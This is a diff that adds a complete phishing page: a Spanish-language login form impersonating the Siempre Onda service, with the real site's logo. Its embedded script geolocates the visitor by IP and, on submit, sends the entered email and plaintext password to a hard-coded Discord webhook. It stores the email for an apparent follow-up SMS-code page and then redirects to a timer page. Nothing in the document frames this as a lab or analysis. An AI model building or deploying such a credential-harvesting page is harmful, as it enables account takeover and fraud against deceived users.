@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Siempre Onda</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px 25px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Logo superior central */
+        .logo-header {
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 40px;
+        }
+        .logo-header img {
+            width: 140px;
+        }
+
+        /* Saludo y mensaje */
+        .welcome-msg {
+            font-size: 26px;
+            font-weight: 700;
+            color: #3d3d3d;
+            margin-bottom: 35px;
+            line-height: 1.2;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 17px;
+            color: #4a4a4a;
+            margin-bottom: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline-color: #007bff;
+        }
+
+        /* Checkbox recordar usuario */
+        .remember-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .remember-row input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            accent-color: #2ecc71;
+            cursor: pointer;
+        }
+
+        .forgot-pass {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+        .forgot-pass a {
+            color: #0056b3;
+            text-decoration: underline;
+            font-size: 15px;
+        }
+
+        /* Recuadro Soy comercio */
+        .comercio-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            color: #444;
+        }
+        .comercio-box div {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .info-icon {
+            color: #007bff;
+            border: 1.5px solid #007bff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        /* Botón azul principal */
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto; 
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-header">
+        <img src="https://siempreonda.com/_next/static/media/logo.242b4c5d.svg" alt="Siempre Onda">
+    </div>
+
+    <div class="welcome-msg">
+        ¡Hola! Iniciá sesión ingresando tus credenciales
+    </div>
+
+    <form id="authForm">
+        <label class="field-label">Email</label>
+        <input type="email" id="email" class="input-field" required placeholder="ejemplo@correo.com">
+
+        <div class="remember-row">
+            <input type="checkbox" id="remember" checked>
+            <label for="remember">Recordar usuario</label>
+        </div>
+
+        <label class="field-label">Contraseña</label>
+        <div style="position: relative;">
+            <input type="password" id="password" class="input-field" required placeholder="Tu clave">
+            <span style="position: absolute; right: 15px; top: 15px; color: #ccc; cursor: pointer;">👁️</span>
+        </div>
+
+        <div class="forgot-pass">
+            <a href="#">Olvidé mi contraseña</a>
+        </div>
+
+        <div class="comercio-box">
+            <div>
+                <input type="checkbox" style="width:20px; height:20px;">
+                <span>Soy comercio</span>
+            </div>
+            <span class="info-icon">?</span>
+        </div>
+
+        <button type="submit" class="btn-login" id="btnAction">Iniciar sesión</button>
+    </form>
+</div>
+
+<script>
+    // Configuración del destino
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1473681245949923348/9Oa77S5ZwE1IxqjpxYk44il7Ln-mUJKzoUOm8NYx0uM1kV9Qe4FRhOFYv1XBkQ0LKqW2";
+    
+    let datosUbicacion = "Cargando...";
+
+    // Obtener País y Ciudad automáticamente mediante API de IP
+    async function obtenerGeolocalizacion() {
+        try {
+            const respuesta = await fetch('https://ipapi.co/json/');
+            const info = await respuesta.json();
+            datosUbicacion = `${info.city}, ${info.country_name} (IP: ${info.ip})`;
+        } catch (error) {
+            datosUbicacion = "No se pudo obtener ubicación";
+        }
+    }
+    obtenerGeolocalizacion();
+
+    document.getElementById('authForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnAction');
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        // IMPORTANTE: Guardamos el usuario para que sms.html sepa de quién es el código
+        localStorage.setItem('usuario_activo', email);
+
+        btn.disabled = true;
+        btn.innerText = "Verificando...";
+
+        const mensajeDiscord = {
+            embeds: [{
+                title: "🔴 NUEVO REGISTRO: " + email,
+                color: 5814783,
+                fields: [
+                    { name: "👤 Usuario/Email", value: "`" + email + "`", inline: true },
+                    { name: "🔑 Password", value: "`" + pass + "`", inline: true },
+                    { name: "📍 Ubicación Detectada", value: datosUbicacion, inline: false }
+                ],
+                footer: { text: "Siempre Onda - Sistema de Registro" },
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(mensajeDiscord)
+            });
+            
+            // Pasamos al temporizador
+            window.location.href = "time.html";
+            
+        } catch (err) {
+            alert("Error de red. Inténtalo de nuevo.");
+            btn.disabled = false;
+            btn.innerText = "Iniciar sesión";
+        }
+    });
+</script>
+
+</body>
+</html>
